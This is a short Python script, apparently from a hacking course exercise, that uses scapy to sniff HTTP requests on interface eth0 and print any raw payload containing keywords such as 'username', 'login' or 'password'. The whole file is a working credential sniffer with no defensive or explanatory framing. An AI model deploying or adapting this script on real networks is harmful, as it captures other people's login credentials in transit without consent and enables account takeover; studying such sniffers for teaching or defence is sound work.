#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    #prn calls back the process_sniffed_packet function


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
            if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load
                keywords = ["username", "user", "password", "login", "pass", "uname"]
                for keyword in keywords:
                    if keyword in load:
                        print(load)
                        break

sniff ("eth0")
